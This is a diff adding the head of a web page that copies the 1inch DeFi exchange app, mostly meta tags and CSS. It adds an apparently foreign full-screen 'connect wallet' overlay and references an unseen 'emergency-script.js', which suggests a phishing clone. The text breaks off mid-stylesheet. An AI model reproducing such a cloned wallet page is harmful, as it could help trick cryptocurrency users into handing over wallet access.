@@ -1,0 +1,1434 @@
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="facebook-domain-verification" content="bgrb14tpf8z21krbqcd3fhm8nrv04t">
+    <title>1inch - DeFi / DEX aggregator on Ethereum, Binance Smart Chain, Optimism, Polygon, Arbitrum</title>
+    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script src="assets/scripts/emergency-script.js"></script>
+    <script>
+        if (location.host === '1inch.exchange') {
+            location.href = 'https://app.1inch.io';
+        }
+    </script>
+
+    <script>
+        document.write('<base href="">');
+    </script><base href="">
+
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <link href="assets/favicon/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180">
+    <link href="assets/favicon/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png">
+    <link href="assets/favicon/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png">
+    <link color="#5bbad5" href="assets/favicon/safari-pinned-tab.svg" rel="mask-icon">
+    <meta content="#da532c" name="msapplication-TileColor">
+    <meta content="#ffffff" name="theme-color">
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style">
+    <meta content="DeFi / DEX aggregator with the most liquidity and the best rates on Ethereum, Binance Smart Chain, Optimism, Polygon, 1inch dApp is an entry point to the 1inch Network's tech." name="description">
+
+    <!-- Start SmartBanner configuration -->
+    <meta name="smartbanner:title" content="1inch DeFi Wallet">
+    <meta name="smartbanner:author" content="1inch Network">
+    <meta name="smartbanner:price" content="FREE">
+    <meta name="smartbanner:price-suffix-apple" content=" - On the App Store">
+    <meta name="smartbanner:icon-apple" content="/assets/images/1inch-wallet-banner-logo.png">
+    <meta name="smartbanner:button" content="VIEW">
+    <meta name="smartbanner:button-url-apple" content="https://apps.apple.com/us/app/1inch-defi-wallet/id1546049391">
+    <meta name="smartbanner:enabled-platforms" content="ios">
+    <meta name="smartbanner:close-label" content="Close">
+    <!--  prevent showing banner in our ios-wallet webview // -->
+    <meta name="smartbanner:exclude-user-agent-regex" content="^.*1inchWallet">
+    <!-- End SmartBanner configuration -->
+    <meta name="facebook-domain-verification" content="ngnzrg8i5y32ls3pul3fdo6b0ves5v">
+
+
+    <link rel="stylesheet" href="assets/smartbanner/smartbanner.min.css" media="all" onload="this.media='all'"><noscript><link rel="stylesheet" href="assets/smartbanner/smartbanner.min.css"></noscript>
+    <script src="assets/smartbanner/smartbanner.min.js"></script>
+    
+    <link rel="stylesheet" href="css_script.css">
+
+    <style>
+        html {
+            background: var(--bg-body-dark);
+        }
+
+        html,
+        body {
+            min-height: 100%;
+            margin: 0;
+            padding: 0;
+            background: var(--bg-body-dark);
+        }
+
+        .spinner {
+            margin: auto;
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            display: flex;
+            width: 50%;
+            height: 50%;
+            background: url('assets/images/loading-logo.svg') no-repeat center center;
+            background-size: contain;
+            -webkit-animation: sk-bounce 2.0s infinite ease-in-out;
+            animation: sk-bounce 2.0s infinite ease-in-out;
+            -webkit-animation-delay: -1.0s;
+            animation-delay: -1.0s;
+        }
+
+        @-webkit-keyframes sk-bounce {
+            0%, 100% {
+                -webkit-transform: scale(0.9)
+            }
+            50% {
+                -webkit-transform: scale(1.0)
+            }
+        }
+
+        @keyframes sk-bounce {
+            0%, 100% {
+                transform: scale(0.9);
+                -webkit-transform: scale(0.9);
+            }
+            50% {
+                transform: scale(1.0);
+                -webkit-transform: scale(1.0);
+            }
+        }
+
+        .spinner-box {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            top: 0;
+            z-index: 99999;
+        }
+
+        @keyframes bg-animation {
+            0% {
+                transform: translate(0, 0);
+            }
+            25% {
+                transform: translate(-0.3%, -0.3%);
+            }
+            50% {
+                transform: translate(-0.3%, 0.3%);
+            }
+            100% {
+                transform: translate(0, 0);
+            }
+        }
+    </style>
+    <link rel="manifest" href="manifest.webmanifest">
+    <meta name="theme-color" content="#1976d2">
+<style>@charset "UTF-8";:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";--font-family-monospace:SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}*,*:before,*:after{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans","Liberation Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}svg{overflow:hidden;vertical-align:middle}@media print{*,*:before,*:after{text-shadow:none!important;box-shadow:none!important}@page{size:a3}body{min-width:992px!important}}:root{--text-white:#ffffff;--text-gray:#7e96b8;--text-lightGray:#9cacc2;--text-red:#c13d54;--text-blue:#5599ff;--text-blue-hover:#6db9ff;--text-black:#222222;--link-blue:#2F8AF5;--bg-body-dark:#06070A;--bg-body-light:#F3F5FA;--bg-accentBlue:#5599ff;--bg-accentBlue-hover:#4399ff;--bg-mainBlue:#dfebff;--bg-darkMainBlue:#1c2d4a;--bg-mainBlue-hover:rgba(85, 153, 255, .4);--bg-transparentBlue-hover:rgba(85, 153, 255, .1);--bg-lightGray:#F3F5FA;--bg-gray:#212a3b;--bg-gray-hover:#293c5d;--bg-gray-disabled:#273043;--bg-lightGray-disabled:rgba(75, 96, 126, .2);--bg-gray-tooltip:#324054;--bg-red:rgba(193, 61, 84, .2);--bg-red-hover:rgba(193, 61, 84, .4);--bg-yellow:rgba(255, 156, 8, .2);--bg-yellow-hover:rgba(255, 156, 8, .4);--bg-lightGreen:rgba(35, 198, 139, .5);--bg-green:rgba(35, 198, 139, .2);--bg-green-hover:rgba(35, 198, 139, .4);--bg-white:rgba(255, 255, 255, .2);--bg-white-hover:rgba(255, 255, 255, .4);--border-gray:rgba(85, 153, 255, .2);--border-lightGray-for-dark-theme:#202835;--border-lightGray-for-light-theme:#dee7f3;--border-gray-disabled:rgba(75, 96, 126, .2);--border-yellow:#ff9c08;--border-red:#c13d54;--border-accentBlue:#3179E4;--border-darkGray:#273a55;--blackBlue:#191f2a;--blackInput:#060A10;--blueAccent:#3179E4;--black:#272a30}:root{--1inch-common-text-01:#FFFFFF;--1inch-common-text-02:#6C86AD;--1inch-common-text-03:#2F8AF5;--1inch-common-text-04:rgba(108, 134, 173, .55);--1inch-common-text-05:#3E2723;--1inch-common-text-06:#401A62;--1inch-common-text-07:#AC86FF;--1inch-common-text-08:#FBFBFB;--1inch-common-text-09:#6DB9FF;--1inch-common-text-10:#222222;--1inch-common-btn-bg-01:#2F8AF5;--1inch-common-btn-bg-02:#FFFFFF;--1inch-common-btn-bg-03:rgba(108, 134, 173, .15);--1inch-common-btn-bg-06:rgba(47, 138, 245, .85);--1inch-common-btn-bg-07:rgba(47, 138, 245, .16);--1inch-common-btn-bg-08:#5AB0FF;--1inch-common-btn-bg-09:rgba(47, 138, 245, .4);--1inch-common-btn-bg-10:rgba(47, 138, 245, .2);--1inch-common-btn-bg-11:rgba(75, 96, 126, .2);--1inch-common-btn-gradient-bg-01:linear-gradient(269.27deg, #2F8AF5 .52%, #0361CE 48.96%, #0FBEE4 100%);--1inch-common-btn-gradient-bg-02:linear-gradient(73.28deg, #8247E5 6.51%, #6027C0 88.45%);--1inch-common-btn-gradient-bg-03:linear-gradient(269.27deg, rgba(47, 138, 245, .85) .52%, rgba(3, 97, 206, .85) 48.96%, rgba(15, 190, 228, .85) 100%);--1inch-common-btn-gradient-bg-04:linear-gradient(73.28deg, #FF0420 6.51%, #C10A1F 88.45%);--1inch-common-bg-01:rgba(108, 134, 173, .1);--1inch-common-bg-02:#FBFBFB;--1inch-common-bg-03:rgba(47, 138, 245, .32);--1inch-common-bg-04:#E3402A;--1inch-common-bg-05:rgba(123, 61, 255, .2);--1inch-common-bg-06:rgba(47, 138, 245, .16);--1inch-common-bg-07:rgba(85, 153, 255, .16);--1inch-common-bg-08:#0000FF;--1inch-common-border-01:#2F8AF5;--1inch-common-icon-color-01:#BAC7DA;--1inch-common-support-01:#FF6F00}body{--1inch-text-01:#FFFFFF;--1inch-text-02:#FFFFFF;--1inch-text-03:#FBFBFB;--1inch-text-04:rgba(108, 134, 173, .55);--1inch-text-05:#6C86AD;--1inch-text-06:rgba(251, 251, 251, .75);--1inch-text-07:#FBFBFB;--1inch-text-08:#9B41B6;--1inch-text-09:rgba(108, 134, 173, .3);--1inch-text-10:rgba(251, 251, 251, .5);--1inch-link-01:#6C86AD;--1inch-link-01-hover:#FFFFFF;--1inch-link-01-active:#FFFFFF;--1inch-link-01-disabled:#6C86AD;--1inch-bg-01:#06070A;--1inch-bg-02:#131823;--1inch-bg-03:rgba(6, 10, 16, .5);--1inch-bg-04:rgba(6, 7, 10, .72);--1inch-bg-05:#06070A;--1inch-bg-06:rgba(6, 7, 10, .75);--1inch-bg-07:#06070A;--1inch-bg-08:rgba(6, 10, 16, .5);--1inch-bg-09:#131823;--1inch-bg-10:rgba(6, 7, 10, .75);--1inch-bg-11:#06070A;--1inch-bg-12:linear-gradient(180deg, rgba(39, 58, 85, 0) 0%, #273a55 50.65%, rgba(39, 58, 85, 0) 100%);--1inch-bg-13:#6C86AD;--1inch-bg-14:#202835;--1inch-bg-15:rgba(6, 10, 16, .5);--1inch-bg-16:rgba(108, 134, 173, .55);--1inch-bg-17:#FBFBFB;--1inch-bg-18:#202835;--1inch-bg-19:#202835;--1inch-bg-20:#06070A;--1inch-bg-21:#06070A;--1inch-bg-22:none;--1inch-page-bg-01:radial-gradient(94.32% 94.6% at 4.04% -44.6%, rgba(47, 138, 245, .4) 0%, rgba(0, 43, 94, 0) 100%), linear-gradient(0deg, #06070A, #06070A);--1inch-page-bg-02:#06070A;--1inch-page-bg-03:radial-gradient(50% 50% at 50% 50%, rgba(40, 94, 176, .41) 0%, rgba(6, 19, 31, 0) 100%);--1inch-page-bg-04:radial-gradient(50% 50% at 50% 50%, rgba(74, 39, 74, .74) 0%, rgba(76, 38, 73, 0) 100%);--1inch-btn-bg-01:#324054;--1inch-btn-bg-02:#131823;--1inch-btn-bg-03:#324054;--1inch-btn-bg-04:#131823;--1inch-btn-bg-05:#324054;--1inch-btn-bg-06:rgba(255, 255, 255, .2);--1inch-btn-bg-07:#04795C;--1inch-tooltip-bg:#324054;--1inch-tooltip-shadow:0 16px 40px rgba(0, 0, 0, .6), 0 -8px 32px rgba(0, 0, 0, .25);--1inch-btn-gradient-bg-01:linear-gradient(73.28deg, #403C3C 6.51%, #403721 88.45%);--1inch-btn-gradient-bg-02:linear-gradient(73.28deg, #495BFC 6.51%, #114188 88.45%);--1inch-btn-gradient-bg-03:linear-gradient(86.38deg, #28A0F0 3.92%, #0678C4 99.17%);--1inch-btn-gradient-bg-04:linear-gradient(73.28deg, #06A77F 6.51%, #04795C 88.45%);--1inch-btn-gradient-bg-05:linear-gradient(73.28deg, #F54942 6.51%, #B42D28 88.45%);--1inch-btn-shadow-01:0 5px 20px rgba(0, 0, 0, .25);--1inch-btn-shadow-02:0 0 4px rgba(0, 0, 0, .1), 0 1px 2px rgba(0, 0, 0, .25);--1inch-btn-shadow-03:none;--1inch-shadow-01:0 0 4px rgba(0, 0, 0, .1), 0 1px 2px rgba(0, 0, 0, .25);--1inch-shadow-02:0 16px 40px rgba(0, 0, 0, .6), 0 -8px 32px rgba(0, 0, 0, .25);--1inch-shadow-03:0 0 4px rgba(0, 0, 0, .1), 0 1px 2px rgba(0, 0, 0, .25);--1inch-shadow-04:none;--1inch-shadow-05:0 1px 0 0 rgba(255, 255, 255, .24) inset, 0 -1px 0 0 rgba(255, 255, 255, .24) inset, 1px 0 0 0 rgba(255, 255, 255, .24) inset, -1px 0 0 0 rgba(255, 255, 255, .24) inset;--1inch-shadow-06:0 1px 0 0 rgba(255, 255, 255, .15) inset, 0 -1px 0 0 rgba(255, 255, 255, .15) inset, 1px 0 0 0 rgba(255, 255, 255, .15) inset, -1px 0 0 0 rgba(255, 255, 255, .15) inset;--1inch-shadow-07:none;--1inch-border-01:#202835;--1inch-border-02:#37445A;--1inch-border-03:#232E3D;--1inch-border-04:#37445A;--1inch-border-05:#202835;--1inch-border-06:rgba(108, 134, 173, .2);--1inch-border-07:rgba(255, 255, 255, .25);--1inch-border-08:#6C86AD;--1inch-border-09:#202835;--1inch-border-10:#37445A;--1inch-border-11:#000000;--1inch-gradient-01:linear-gradient(102.17deg, #773DF3 11.34%, #2C0D2D 88.44%);--1inch-gradient-02:linear-gradient(90deg, #9C27B0 0%, #5E35B1 100%);--1inch-gradient-03:radial-gradient(75.97% 118.44% at 0% 0%, #9957FD 0%, rgba(6, 3, 37, 0) 100%), radial-gradient(60.94% 100% at 100% 100%, rgba(204, 0, 255, .3) 0%, rgba(90, 0, 181, 0) 100%), radial-gradient(78.65% 149.06% at 100% 100%, rgba(166, 126, 251, .29) 0%, rgba(34, 0, 131, 0) 100%), radial-gradient(60.19% 140.28% at 0% 13.27%, rgba(17, 14, 169, .7) 0%, rgba(22, 65, 131, .07) 100%);--1inch-gradient-04:linear-gradient(90deg, rgba(156, 39, 176, .2) 0%, rgba(94, 53, 177, .2) 100%);--1inch-gradient-05:radial-gradient(75.97% 118.44% at 0% 0%, rgba(47, 138, 245, .75) 0%, rgba(6, 3, 37, 0) 100%), radial-gradient(60.94% 100% at 100% 100%, rgba(255, 37, 37, .5) 0%, rgba(90, 0, 181, 0) 100%), radial-gradient(78.65% 149.06% at 100% 100%, rgba(166, 126, 251, .29) 0%, rgba(34, 0, 131, 0) 100%), radial-gradient(60.19% 140.28% at 0% 13.27%, rgba(17, 14, 169, .7) 0%, rgba(22, 65, 131, .07) 100%);--1inch-hover-01:#0C121A;--1inch-icon-color-01:#FFFFFF;--1inch-icon-color-02:#BAC7DA;--1inch-icon-color-03:#6C86AD;--1inch-tooltip-bg-01:#324054;--1inch-logo-color-01:#FFFFFF;--1inch-blur-bg-01:rgba(0, 0, 0, .5);--1inch-warning-text-01:#FF8078;--1inch-warning-text-02:#FFC700;--1inch-warning-text-03:#21C187;--1inch-warning-bg-01:rgba(193, 61, 84, .25);--1inch-warning-bg-02:rgba(47, 138, 245, .16);--1inch-warning-bg-03:rgba(255, 156, 8, .25);--1inch-warning-bg-04:rgba(51, 119, 107, .25);--1inch-warning-bg-04-opaque:rgba(51, 119, 107, .25);--1inch-skeleton-bg-01:rgba(12, 18, 26, .5);--1inch-skeleton-bg-02:rgba(12, 18, 26, 0);--1inch-skeleton-bg-03:rgba(108, 134, 173, .53);--1inch-skeleton-bg-04:rgba(19, 24, 35, .5);--1inch-skeleton-bg-05:rgba(19, 24, 35, 0)}*{box-sizing:border-box}body{margin:0;line-height:1;font-family:Roboto,serif}html{background:var(--bg-body-dark)}body{background:var(--bg-body-dark);color:var(--white)}#intercom-disabled-cookie{display:none;position:fixed;z-index:2147483003;bottom:20px;left:20px;width:60px;height:60px;border-radius:50%;background:#2392ec;cursor:pointer;box-shadow:0 1px 6px #0000000f,0 2px 32px #00000029}#intercom-disabled-cookie .intercom-lightweight-app-launcher-icon{display:flex;align-items:center;justify-content:center;position:absolute;top:0;left:0;width:60px;height:60px;transition:transform .1s linear,opacity 80ms linear}#intercom-disabled-cookie .intercom-lightweight-app-launcher-icon svg{width:28px;height:32px;fill:#fff}@media (max-width: 720px){.intercom-lightweight-app-launcher{bottom:14px!important;left:16px!important;width:36px!important;height:36px!important}.intercom-lightweight-app-launcher-icon{width:20px!important;height:20px!important;left:8px!important;top:8px!important}}</style><link rel="stylesheet" href="styles.4a45dc9491de0965.css" media="all" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.4a45dc9491de0965.css"></noscript>
+
+<style>
+.modal-connect-wallet {
+    width: 80%;
+    max-width: 651px;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    max-height: 80vh;
+    display: flex;
+    flex-direction: column;
+    padding: 20px;
+    background: #131823;
+    color: #fff;
+    border-radius: 20px;
+	overflow-y: auto;
+	overflow-x: hidden;
+}
+
+.tab1 {
+    display: flex;
+    flex-direction: column;
+}
+
+span.connect-wallet-title {
+    display: flex;
+    align-items: center;
+    padding-left: 0!important;
+    margin: 10px 0;
+}
+
+span.number-tab {
+    background: #212a3b;
+    color: #7e96b8;
+    display: block;
+    border-radius: 50%;
+    width: 30px;
+    height: 30px;
+    text-align: center;
+    line-height: 30px;
+    margin-right: 8px;
+}
+
+.modal-connect-wallet > div > * {
+    padding-left: 34px;
+}
+
+.modal-connect-wallet > div {
+    margin-bottom: 10px;
+}
+
+.tab1 label {
+    display: flex;
+    align-items: center;
+    line-height: 20px;
+    width: fit-content;
+}
+
+.tab1 label input[type="checkbox"] {
+    margin: 0;
+    margin-right: 8px;
+}
+
+.buttons-row {
+    display: flex;
+    flex-wrap: wrap;
+}
+
+.button-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    border-radius: 10px;
+    padding: 14px 24px;
+    cursor: pointer;
+    position: relative;
+	width: 120px;
+    box-sizing: border-box;
+    text-align: center;
+	font-size: 12px;
+}
+
+.button-wrap.disabled {
+	filter: grayscale(100%);
+    pointer-events: none;
+	order: 1;
+}
+
+@media (max-width: 720px) {
+                    .button-wrap {
+                        width: 90px;
+                    }
+                }
+
+.button-wrap img {
+    width: 60px;
+    height: 60px;
+    margin-bottom: 7px;
+}
+
+.button-wrap:hover { 
+    background: #060a10;
+}
+
+.button-wrap span {
+	color: #fff;
+}
+
+.button-wrap span:hover {
+	color: #fff;
+}
+
+.button-wrap a:hover {
+	text-decoration: none;
+	outline: 0;
+}
+
+.button-wrap.active:after {content: "";height: 20px;width: 20px;position: absolute;background-image: url(https://app.1inch.io/assets/images/circle_done.svg);background-color: #131823;border-radius: 20px;padding: 2px;background-position: center;background-repeat: no-repeat;background-size: 20px;top: 48px;right: 18px;}
+
+.button-wrap:hover:after {
+    background-color: #060a10;
+}
+
+
+.tab2 .buttons-row,
+.tab3 .buttons-row {
+    filter: grayscale(100%);
+    pointer-events: none;
+}
+
+.tab1.active + .tab2 .buttons-row {
+    filter: none;
+    pointer-events: all;
+}
+
+.tab2.active + .tab3 .buttons-row {
+    filter: none;
+    pointer-events: all;
+    order: -1;
+}
+
+#dwallets {
+position: fixed;
+display: flex;
+left: 0;
+top: 0;
+width: 100%;
+height: 100%;
+background: var(--1inch-blur-bg-01)!important;
+-webkit-backdrop-filter: blur(3px)!important;
+backdrop-filter: blur(3px)!important;
+z-index: 9999;
+}
+.mat-dialog-actions {
+	padding-left: 0;
+}
+
+.icon-button-close {
+	position: absolute;
+	top: 0;
+	right: 0;
+	border: 0;
+}
+
+.tab2 .buttons-row, .tab3 .buttons-row { 
+	padding-left: 0;
+}
+</style>
+
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-142133284-1"></script><style>.app-header-wrap[_ngcontent-ipc-c301]{margin-bottom:50px}@media (max-width: 418px){.app-header-wrap[_ngcontent-ipc-c301]{margin-bottom:24px}}@media (max-width: 360px){.app-header-wrap[_ngcontent-ipc-c301]{margin-bottom:12px}}.drawer-wrap-z-index[_ngcontent-ipc-c301]{z-index:2500000000}.drawer-container[_ngcontent-ipc-c301]{width:100%;height:100%}.drawer-container[_ngcontent-ipc-c301]  .mat-drawer-inner-container{overflow:hidden!important}.example-sidenav-content[_ngcontent-ipc-c301]:before{content:"";z-index:-1;position:absolute;width:1146px;height:1146px;right:-750px;top:50px;background:var(--1inch-page-bg-04);opacity:.7}.example-sidenav-content[_ngcontent-ipc-c301]:after{content:"";z-index:-1;position:absolute;width:1228px;height:1228px;left:-742px;top:-50px;background:var(--1inch-page-bg-03);opacity:.7}.cookies-popup-wrap[_ngcontent-ipc-c301]{position:fixed;z-index:10000;bottom:32px;right:32px;width:320px}@media (max-width: 520px){.cookies-popup-wrap[_ngcontent-ipc-c301]{bottom:64px;right:0;width:100%}}@media (max-width: 720px){.link-warning[_ngcontent-ipc-c301]{display:none}.example-sidenav-content[_ngcontent-ipc-c301]:before, .example-sidenav-content[_ngcontent-ipc-c301]:after{background:transparent!important}}</style><style>[_nghost-ipc-c161]{position:relative;display:block;flex:1}.scrollbar[_ngcontent-ipc-c161]{position:fixed;top:0;left:0;bottom:0;right:0;margin:0}.content[_ngcontent-ipc-c161]{position:relative;z-index:0;height:100%}</style><style>.mat-drawer-container{position:relative;z-index:1;box-sizing:border-box;-webkit-overflow-scrolling:touch;display:block;overflow:hidden}.mat-drawer-container[fullscreen]{top:0;left:0;right:0;bottom:0;position:absolute}.mat-drawer-container[fullscreen].mat-drawer-container-has-open{overflow:hidden}.mat-drawer-container.mat-drawer-container-explicit-backdrop .mat-drawer-side{z-index:3}.mat-drawer-container.ng-animate-disabled .mat-drawer-backdrop,.mat-drawer-container.ng-animate-disabled .mat-drawer-content,.ng-animate-disabled .mat-drawer-container .mat-drawer-backdrop,.ng-animate-disabled .mat-drawer-container .mat-drawer-content{transition:none}.mat-drawer-backdrop{top:0;left:0;right:0;bottom:0;position:absolute;display:block;z-index:3;visibility:hidden}.mat-drawer-backdrop.mat-drawer-shown{visibility:visible}.mat-drawer-transition .mat-drawer-backdrop{transition-duration:400ms;transition-timing-function:cubic-bezier(0.25, 0.8, 0.25, 1);transition-property:background-color,visibility}.cdk-high-contrast-active .mat-drawer-backdrop{opacity:.5}.mat-drawer-content{position:relative;z-index:1;display:block;height:100%;overflow:auto}.mat-drawer-transition .mat-drawer-content{transition-duration:400ms;transition-timing-function:cubic-bezier(0.25, 0.8, 0.25, 1);transition-property:transform,margin-left,margin-right}.mat-drawer{position:relative;z-index:4;display:block;position:absolute;top:0;bottom:0;z-index:3;outline:0;box-sizing:border-box;overflow-y:auto;transform:translate3d(-100%, 0, 0)}.cdk-high-contrast-active .mat-drawer,.cdk-high-contrast-active [dir=rtl] .mat-drawer.mat-drawer-end{border-right:solid 1px currentColor}.cdk-high-contrast-active [dir=rtl] .mat-drawer,.cdk-high-contrast-active .mat-drawer.mat-drawer-end{border-left:solid 1px currentColor;border-right:none}.mat-drawer.mat-drawer-side{z-index:2}.mat-drawer.mat-drawer-end{right:0;transform:translate3d(100%, 0, 0)}[dir=rtl] .mat-drawer{transform:translate3d(100%, 0, 0)}[dir=rtl] .mat-drawer.mat-drawer-end{left:0;right:auto;transform:translate3d(-100%, 0, 0)}.mat-drawer-inner-container{width:100%;height:100%;overflow:auto;-webkit-overflow-scrolling:touch}.mat-sidenav-fixed{position:fixed}
+</style><style>.sidebar-header[_ngcontent-ipc-c268]{margin:-16px;padding:16px;display:flex;justify-content:space-between}.sidebar-content[_ngcontent-ipc-c268]{max-height:calc(100vh - 52px);overflow:scroll;margin:8px -16px 0 0;padding:0 16px 164px 0}.sidebar-links[_ngcontent-ipc-c268]{padding:24px 0;border-bottom:1px solid var(--1inch-border-01)}.sidebar-links[_ngcontent-ipc-c268]:last-of-type{border-bottom:none}.sidebar-panel[_ngcontent-ipc-c268]{box-shadow:none!important;background:var(--1inch-bg-11)!important;margin:0}.sidebar-panel[_ngcontent-ipc-c268] > *[_ngcontent-ipc-c268]{background:var(--1inch-bg-11)!important}.sidebar-link[_ngcontent-ipc-c268]{padding:0!important;height:24px!important;font-size:16px;font-weight:500;text-decoration:none;color:currentColor}.sidebar-link-disabled[_ngcontent-ipc-c268]{color:var(--text-gray);opacity:.5}.sidebar-link-tooltip[_ngcontent-ipc-c268]{margin:-1px 0 0 4px;color:var(--text-gray)}.sidebar-sublinks[_ngcontent-ipc-c268]{display:grid;grid-row-gap:24px;margin:16px -24px -16px}.sidebar-sublink[_ngcontent-ipc-c268]{display:flex;align-items:center;color:var(--text-gray);text-decoration:none;font-size:16px;font-weight:500}.sidebar-sublink-disabled[_ngcontent-ipc-c268]{opacity:.5}.sidebar-sublink-icon[_ngcontent-ipc-c268]{margin-right:16px}.sidebar-link-external[_ngcontent-ipc-c268]{position:relative}.sidebar-link-external[_ngcontent-ipc-c268]:before, .sidebar-link-external[_ngcontent-ipc-c268]:after{content:" ";border-radius:50%;position:absolute;background:var(--1inch-common-support-01)}.sidebar-link-external[_ngcontent-ipc-c268]:before{width:8px;height:8px;top:-4px;right:-11px;opacity:.2}.sidebar-link-external[_ngcontent-ipc-c268]:after{width:4px;height:4px;top:-2px;right:-9px;opacity:.5}.sidebar-link-hidden[_ngcontent-ipc-c268]{display:none}.sidebar-sub-sublinks[_ngcontent-ipc-c268]   .sidebar-link[_ngcontent-ipc-c268]{color:var(--text-gray)}.sidebar-sub-sublinks[_ngcontent-ipc-c268]   .sidebar-link[_ngcontent-ipc-c268]:hover, .sidebar-sub-sublinks[_ngcontent-ipc-c268]   .sidebar-link[_ngcontent-ipc-c268]:focus{color:var(--1inch-text-03)}</style><style>.cookies-popup[_ngcontent-ipc-c299]{padding:24px;border-radius:12px;background:var(--1inch-bg-14);box-shadow:var(--1inch-shadow-07)}@media (max-width: 520px){.cookies-popup[_ngcontent-ipc-c299]{padding:26px 16px 24px;border-radius:0}}.cookies-popup-close-icon[_ngcontent-ipc-c299]{position:absolute;right:10px;top:10px;color:var(--1inch-common-text-02)}.cookies-popup-close-icon[_ngcontent-ipc-c299]:hover, .cookies-popup-close-icon[_ngcontent-ipc-c299]:focus{color:var(--1inch-text-01)}.cookies-popup-info-wrap[_ngcontent-ipc-c299]{display:grid;grid-template-columns:48px 1fr;grid-column-gap:16px}.cookies-popup-info-wrap[_ngcontent-ipc-c299]   .cookies-popup-image[_ngcontent-ipc-c299]{width:48px;height:48px}.cookies-popup-text[_ngcontent-ipc-c299]{font-size:13px;line-height:15px;color:var(--1inch-text-07)}@media (max-width: 520px){.cookies-popup-text[_ngcontent-ipc-c299]{padding-right:20px}}.cookies-popup-text-top[_ngcontent-ipc-c299]{margin-bottom:16px}.cookies-popup-link[_ngcontent-ipc-c299]{text-decoration:none;font-weight:500;color:var(--1inch-common-text-03)}.cookies-popup-link[_ngcontent-ipc-c299]:hover, .cookies-popup-link[_ngcontent-ipc-c299]:focus{opacity:.9}.cookies-popup-buttons-wrap[_ngcontent-ipc-c299]{margin-top:24px;display:grid;grid-template-columns:1fr 1fr;grid-column-gap:16px}.cookies-popup-button[_ngcontent-ipc-c299]{font-size:16px;line-height:26px;font-weight:500;padding:5px 0;border-radius:12px}.cookies-popup-button[_ngcontent-ipc-c299]:hover, .cookies-popup-button[_ngcontent-ipc-c299]:focus{opacity:.9}.cookies-popup-button.agree-button[_ngcontent-ipc-c299]{color:var(--1inch-common-text-08);background:var(--1inch-common-text-03)}.cookies-popup-button.decline-button[_ngcontent-ipc-c299]{color:var(--1inch-common-text-03);background:var(--1inch-common-btn-bg-07)}</style><style>[_nghost-ipc-c160]{display:none}</style><style>[_nghost-ipc-c124]{position:relative;z-index:0;display:block;height:100%}[_nghost-ipc-c124]:before{content:'';display:block;overflow:hidden}.position-fixed-offset[_ngcontent-ipc-c124]{position:fixed;left:0;top:0;pointer-events:none;visibility:hidden;width:100%;height:100%}</style><style>[_nghost-ipc-c158]{position:fixed;bottom:0;left:0;width:100%;height:0}.t-text[_ngcontent-ipc-c158]{white-space:pre-wrap}</style><style>.header[_ngcontent-ipc-c297]{padding:16px 0}.header-content[_ngcontent-ipc-c297]{display:flex;justify-content:space-between;align-items:center}.header-left-col[_ngcontent-ipc-c297]{display:flex;align-items:center}.logo-color[_ngcontent-ipc-c297]{margin-right:28px;color:var(--1inch-logo-color-01)}.logo-color[_ngcontent-ipc-c297]:hover{opacity:.85}.header-nav-menu[_ngcontent-ipc-c297]{display:block}.header-buttons[_ngcontent-ipc-c297]{display:flex;justify-content:flex-end}.header-button-wrap[_ngcontent-ipc-c297]{margin-right:8px}.header-settings-button[_ngcontent-ipc-c297]{width:36px;height:36px;padding:6px;margin:0 -6px 0 14px;border:none;border-radius:12px;color:var(--1inch-common-text-02)}.header-settings-button[_ngcontent-ipc-c297]:hover{color:var(--1inch-text-01);background:var(--1inch-common-btn-bg-03)}.header-account-button-wrap[_ngcontent-ipc-c297]{display:flex}.header-burger-icon[_ngcontent-ipc-c297], .header-claim-button-mobile[_ngcontent-ipc-c297], .header-logo-mobile[_ngcontent-ipc-c297]{display:none}.header-claim-button-desktop[_ngcontent-ipc-c297]{position:relative}.network-warning[_ngcontent-ipc-c297]{margin-top:8px;padding:8px 0;text-align:center;background:var(--1inch-common-bg-04);color:var(--1inch-common-text-08);line-height:18px}.token-claim-wrap[_ngcontent-ipc-c297]{position:absolute;top:44px;right:-232px;z-index:1000;width:380px}@media (max-width: 720px){.token-claim-wrap[_ngcontent-ipc-c297]{right:-200px}}@media (max-width: 520px){.token-claim-wrap[_ngcontent-ipc-c297]{width:100%;position:fixed;bottom:0;left:0;top:unset;z-index:10000}}@media (max-width: 